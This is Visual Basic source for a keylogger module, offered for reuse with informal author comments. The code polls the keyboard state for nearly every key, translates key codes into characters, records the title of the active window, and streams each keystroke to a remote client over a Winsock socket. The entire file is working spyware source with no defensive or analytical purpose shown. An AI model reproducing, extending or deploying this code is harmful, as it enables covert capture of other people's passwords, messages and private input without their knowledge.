Attribute VB_Name = "Keylogger"
Option Explicit
Private Declare Function GetAsyncKeyState Lib "user32" (ByVal vKey As Long) As Integer
Private Declare Function GetKeyState Lib "user32" (ByVal nVirtKey As Long) As Integer
Private Declare Function GetActiveWindow Lib "user32" () As Long
Private Declare Function GetWindowTextA Lib "user32" (ByVal hwnd As Long, ByVal lpString As String, ByVal aint As Long) As Long
Private Declare Function GetForegroundWindow Lib "user32" () As Long
 
Public Function KeyLog(Socket As Winsock) ' You can edit this function to suite you, In this case were going to use winsock so this is the best way to go about it.

 Dim KeyToSend                As String
 Dim PressedKey               As String
 Dim n                        As Integer
 
 
 
'PressedKey = GetAsyncKeyState(1)
 'If PressedKey = -32767 Then
 'KeyToSend= "[LC]"
 'GoTo KeyFound
 'End If
 
'PressedKey = GetAsyncKeyState(2)
 'If PressedKey = -32767 Then
 'KeyToSend= "[RC]"
 'GoTo KeyFound
 'End If

'The above green is just Right click and Left click, to have the keylogger show when the user right clicks or left clicks just remove the 's ( They piss me off, makes the logged keys look all untidy.
 
 'BELOW are all the key states, we identify them by the AsyncKeyState NUMBER
 

PressedKey = GetAsyncKeyState(13)
 If PressedKey = -32767 Then
 KeyToSend = "ÀBRÀ"
 GoTo KeyFound
 End If
    
PressedKey = GetAsyncKeyState(8)
 If PressedKey = -32767 Then
 KeyToSend = "ÀBSÀ" ' This is the backspace key, You can just have it send [BackSpace] or whatever, but I do it this way and have the client deal with it (saves showing lots of [BackSpaces] in the client)
 GoTo KeyFound
 End If
 
PressedKey = GetAsyncKeyState(9)
 If PressedKey = -32767 Then
 KeyToSend = "[TAB]"
 GoTo KeyFound
 End If
 
PressedKey = GetAsyncKeyState(17)
 If PressedKey = -32767 Then
  KeyToSend = "[CTRL]"
 GoTo KeyFound
 End If
 
PressedKey = GetAsyncKeyState(18)
 If PressedKey = -32767 Then
 KeyToSend = "[ALT]"
 GoTo KeyFound
 End If
 
PressedKey = GetAsyncKeyState(46)
 If PressedKey = -32767 Then
 KeyToSend = "[Del]"
 GoTo KeyFound
 End If

PressedKey = GetAsyncKeyState(32)
 If PressedKey = -32767 Then
 KeyToSend = " "
 GoTo KeyFound
 End If
    
PressedKey = GetAsyncKeyState(186)
 If PressedKey = -32767 Then
 If GetShift = False Then KeyToSend = ";" Else KeyToSend = ":"
 GoTo KeyFound
 End If
 
PressedKey = GetAsyncKeyState(187)
 If PressedKey = -32767 Then
 If GetShift = False Then KeyToSend = "=" Else KeyToSend = "+"
 GoTo KeyFound
 End If
  
PressedKey = GetAsyncKeyState(188)
 If PressedKey = -32767 Then
 If GetShift = False Then KeyToSend = "," Else KeyToSend = "<"
 GoTo KeyFound
 End If
   
PressedKey = GetAsyncKeyState(189)
 If PressedKey = -32767 Then
 If GetShift = False Then KeyToSend = "-" Else KeyToSend = "_"
 GoTo KeyFound
 End If
  
PressedKey = GetAsyncKeyState(190)
 If PressedKey = -32767 Then
 If GetShift = False Then KeyToSend = "." Else KeyToSend = ">"
 GoTo KeyFound
 End If
 
PressedKey = GetAsyncKeyState(191)
 If PressedKey = -32767 Then
 If GetShift = False Then KeyToSend = "/" Else KeyToSend = "?" '/
 GoTo KeyFound
 End If
  
PressedKey = GetAsyncKeyState(192)
 If PressedKey = -32767 Then
 If GetShift = False Then KeyToSend = "`" Else KeyToSend = "~"     '`
 GoTo KeyFound
 End If

PressedKey = GetAsyncKeyState(96)
 If PressedKey = -32767 Then
 If GetShift = False Then KeyToSend = "0" Else KeyToSend = ")"
 GoTo KeyFound
 End If
 
PressedKey = GetAsyncKeyState(97)
 If PressedKey = -32767 Then
 If GetShift = False Then KeyToSend = "1" Else KeyToSend = "!"
 GoTo KeyFound
 End If

PressedKey = GetAsyncKeyState(98)
 If PressedKey = -32767 Then
 If GetShift = False Then KeyToSend = "2" Else KeyToSend = "@"
 GoTo KeyFound
 End If
 
PressedKey = GetAsyncKeyState(99)
 If PressedKey = -32767 Then
 If GetShift = False Then KeyToSend = "3" Else KeyToSend = "#"
 GoTo KeyFound
 End If
    
PressedKey = GetAsyncKeyState(100)
 If PressedKey = -32767 Then
 If GetShift = False Then KeyToSend = "4" Else KeyToSend = "$"
 GoTo KeyFound
 End If
 
PressedKey = GetAsyncKeyState(101)
 If PressedKey = -32767 Then
 If GetShift = False Then KeyToSend = "5" Else KeyToSend = "%"
 GoTo KeyFound
 End If
    
PressedKey = GetAsyncKeyState(102)
 If PressedKey = -32767 Then
 If GetShift = False Then KeyToSend = "6" Else KeyToSend = "^"
 GoTo KeyFound
 End If
 
PressedKey = GetAsyncKeyState(103)
 If PressedKey = -32767 Then
 If GetShift = False Then KeyToSend = "7" Else KeyToSend = "&"
 GoTo KeyFound
 End If
    
PressedKey = GetAsyncKeyState(104)
 If PressedKey = -32767 Then
 If GetShift = False Then KeyToSend = "8" Else KeyToSend = "*"
 GoTo KeyFound
 End If
 
PressedKey = GetAsyncKeyState(105)
 If PressedKey = -32767 Then
 If GetShift = False Then KeyToSend = "9" Else KeyToSend = "("
 GoTo KeyFound
 End If
    
PressedKey = GetAsyncKeyState(106)
 If PressedKey = -32767 Then
 If GetShift = False Then KeyToSend = "*" Else KeyToSend = ""
 GoTo KeyFound
 End If
 
PressedKey = GetAsyncKeyState(107)
 If PressedKey = -32767 Then
 If GetShift = False Then KeyToSend = "=" Else KeyToSend = "+"
 GoTo KeyFound
 End If
     
PressedKey = GetAsyncKeyState(109)
 If PressedKey = -32767 Then
 If GetShift = False Then KeyToSend = "-" Else KeyToSend = "_"
 GoTo KeyFound
 End If
    
PressedKey = GetAsyncKeyState(110)
 If PressedKey = -32767 Then
 If GetShift = False Then KeyToSend = "." Else KeyToSend = ">"
 GoTo KeyFound
 End If
 
PressedKey = GetAsyncKeyState(220)
 If PressedKey = -32767 Then
 If GetShift = False Then KeyToSend = "\" Else KeyToSend = "|"
 GoTo KeyFound
 End If

PressedKey = GetAsyncKeyState(222)
 If PressedKey = -32767 Then
 If GetShift = False Then KeyToSend = "'" Else KeyToSend = Chr(34)
 GoTo KeyFound
 End If

PressedKey = GetAsyncKeyState(221)
 If PressedKey = -32767 Then
 If GetShift = False Then KeyToSend = "]" Else KeyToSend = "}"
 GoTo KeyFound
 End If
    
PressedKey = GetAsyncKeyState(219) '219
 If PressedKey = -32767 Then
 If GetShift = False Then KeyToSend = "[" Else KeyToSend = "{"
 GoTo KeyFound
 End If

For n = 65 To 128
    PressedKey = GetAsyncKeyState(n)
    If PressedKey = -32767 Then
       If GetShift = False Then
               
        If (Chr(n)) = "C" Then
       
        End If
              
            If GetCapslock = True Then KeyToSend = UCase(Chr(n)) Else KeyToSend = LCase(Chr(n))
        Else
            If GetCapslock = False Then KeyToSend = UCase(Chr(n)) Else KeyToSend = LCase(Chr(n))
        End If
        GoTo KeyFound
    End If
Next n


For n = 48 To 57
    PressedKey = GetAsyncKeyState(n)
    If PressedKey = -32767 Then
        If GetShift = True Then
            Select Case Val(Chr(n))
                Case 1
                    KeyToSend = "!"
                Case 2
                    KeyToSend = "@"
                Case 3
                    KeyToSend = "#"
                Case 4
                    KeyToSend = "$"
                Case 5
                    KeyToSend = "%"
                Case 6
                    KeyToSend = "^"
                Case 7
                    KeyToSend = "&"
                Case 8
                    KeyToSend = "*"
                Case 9
                    KeyToSend = "("
                Case 0
                    KeyToSend = ")"
            End Select
        Else
            KeyToSend = Chr(n)
        End If
        GoTo KeyFound
    End If
Next n
DoEvents
Exit Function

KeyFound:
 Main.ActiveWin = GetActiveWindowCaption ' When a key is pressed, we put the active window ( window thats been typed into )'s caption name into the text box.
 If KeyToSend <> "" Then Socket.SendData KeyToSend
DoEvents

End Function

Public Function GetCapslock() As Boolean
 GetCapslock = CBool(GetKeyState(vbKeyCapital) And 1)
End Function

Public Function GetShift() As Boolean
 GetShift = CBool(GetAsyncKeyState(vbKeyShift))
End Function

Public Function GetActiveWindowCaption() As String
Dim lCurHWND As Long, sRet As String, lRet As Long, lNull As Long
sRet = Space(256)
lCurHWND = GetActiveWindow()
lRet = GetWindowTextA(lCurHWND, sRet, 256)
DoEvents
lNull = GetActiveWindow()
lCurHWND = GetForegroundWindow()
sRet = Space(256)
lRet = GetWindowTextA(lNull, sRet, 256)
sRet = Space(256)
lRet = GetWindowTextA(lCurHWND, sRet, 256)
GetActiveWindowCaption = sRet
End Function
